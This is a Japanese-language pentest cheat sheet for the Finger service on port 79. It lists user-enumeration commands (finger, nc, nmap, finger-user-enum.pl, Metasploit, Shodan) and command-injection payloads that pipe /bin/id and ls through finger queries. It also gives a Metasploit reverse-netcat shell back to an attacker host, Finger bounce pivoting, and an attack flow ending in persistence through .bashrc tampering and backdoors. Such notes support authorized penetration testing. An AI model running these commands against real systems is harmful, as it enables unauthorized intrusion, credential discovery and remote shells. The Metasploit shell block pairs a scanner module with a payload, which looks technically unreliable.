# Finger とは

- ユーザー情報を取得するためのプロトコル・サービス（RFC 1288）
- **ログイン名・フルネーム・オフィス所在地・電話番号・アイドル時間・最終メール受信時刻**、およびユーザーのプランファイル（`.plan`）・プロジェクトファイル（`.project`）の内容を返す
- 認証なしでリモートからユーザー情報を照会できるため、**ユーザー列挙の踏み台**として悪用されることがある
- 一部の実装ではコマンドインジェクションが可能
- デフォルトポート：79

---

# 接続

## 基本接続（nc）

```zsh
nc -vn <TargetIP> 79
echo "root" | nc -vn <TargetIP> 79
```

## fingerコマンド

```zsh
finger @<TargetIP>          # システム上の全ユーザー一覧
finger <username>@<TargetIP> # 特定ユーザーの詳細情報
```

---

# Recon

## バナーグラブ・バージョン確認

```zsh
nc -vn <TargetIP> 79
nmap -sV -p 79 --script=banner <TargetIP>
```

確認すべき情報：

- OSバージョン
- Fingerデーモンのバージョン（古い実装はRCEに脆弱な場合あり）

---

# Enumeration

## fingerコマンドによるユーザー列挙

```zsh
finger @<TargetIP>           # ユーザー一覧
finger <username>@<TargetIP> # 特定ユーザーの情報
```

## finger-user-enum.pl（PentestMonkey）

```zsh
finger-user-enum.pl -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t <TargetIP>
finger-user-enum.pl -u root -t <TargetIP>
finger-user-enum.pl -U users.txt -T ips.txt
```

## nmap スクリプト

```zsh
nmap -p 79 --script finger <TargetIP>
nmap -sV -p 79 --script=banner <TargetIP>
```

## Metasploit

```zsh
use auxiliary/scanner/finger/finger_users
set RHOSTS <TargetIP>
set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt
run
```

## Shodan

```
port:79 USER
```

---

# Exploit

## コマンドインジェクション（RCE）

一部のFingerサービス実装では、入力のサニタイズが不十分なため、パイプを通じて任意のコマンドを実行できる。

```zsh
finger "|/bin/id@<TargetIP>"
finger "|/bin/ls -a /@<TargetIP>"
```

### Metasploit でリバースシェル

```zsh
use auxiliary/scanner/finger/finger_users
set RHOSTS <TargetIP>
set PAYLOAD cmd/unix/reverse_netcat
set LHOST <AttackerIP>
set LPORT 4444
exploit
```

## Finger Bounce（ピボット）

中間の侵害済みホストを経由して、ファイアウォール内部のマシンへFingerクエリをリレーする手法。

```zsh
finger user@<CompromisedHost>@<VictimIP>   # 中間ホスト経由でクエリをリレー
finger @<InternalHost>@<ExternalHost>      # 別フォーマット
```

> [!TIP] Finger Bounceは、外部から直接アクセスできない内部マシンへのラテラルムーブメントに使える。侵害済みのホストをリレーとして、内部ネットワーク上のFingerサービスへクエリを送る。

## プランファイル・プロジェクトファイルの確認

Fingerは `~/.plan` や `~/.project` の内容を返すことがある。プロジェクトタイムラインや機密情報、場合によってはクレデンシャルが含まれていることがある。

---

# 攻撃フロー（まとめ）

1. **Recon**：nmap / nc でポート79が開いているか確認し、バージョンを把握する
2. **Enumeration**：`finger @<TargetIP>` や `finger-user-enum.pl` でユーザー一覧を取得する
3. **Exploitation**：コマンドインジェクションが可能な実装であれば `finger "|/bin/id@<TargetIP>"` 等でRCEを試みる
4. **Lateral Movement**：Finger Bounceで内部ネットワークへピボットする
5. **Post-Exploitation**：権限昇格・永続化（`.bashrc`改ざん、バックドア設置等）

---

# 関連CVE

|CVE|概要|
|---|---|
|CVE-1999-0601|Fingerサービスが有効になっており、リモートユーザーが認証なしでシステム上の有効ユーザーを列挙できる|